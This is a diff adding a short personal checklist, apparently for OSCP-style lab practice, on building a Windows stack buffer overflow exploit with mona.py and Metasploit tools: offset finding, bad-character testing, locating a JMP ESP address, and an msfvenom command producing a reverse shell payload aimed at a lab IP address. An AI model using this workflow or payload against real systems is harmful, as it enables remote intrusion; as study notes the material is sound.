@@ -1,0 +1,12 @@
+1. fuzz and find offset
+2. !mona config -set workingfolder c:\mona\%p
+2. metasploit-framework/tools/exploit/pattern_create.rb -l <offset> + 400
+3. copy that shit into paylaod and send python3 exploit.py
+4. !mona findmsp -distance <offset> and look for EIP contains normal pattern : ... (offset XXXX) // that is are actualy offset
+5. set rturn to B, will be 424242442
+6. !mona bytearray -b "\x00" find correct bytes for are payload.
+7. !mona compare -f C:\mona\oscp\bytearray.bin -a <address of ESP>
+8. !mona bytearray -b "<put all bad chars>" // rerun with all bad chars excluded from bad_char_generator
+9. // find jump point for rtrn address // !mona jmp -r esp -cpb "<bad_chars>"
+10. msfvenom -p windows/shell_reverse_tcp LHOST=10.6.27.38 LPORT=4444 EXITFUNC=thread -b "<bad_chars>" -f c
+11. set padding to // padding = "\x90" * 16
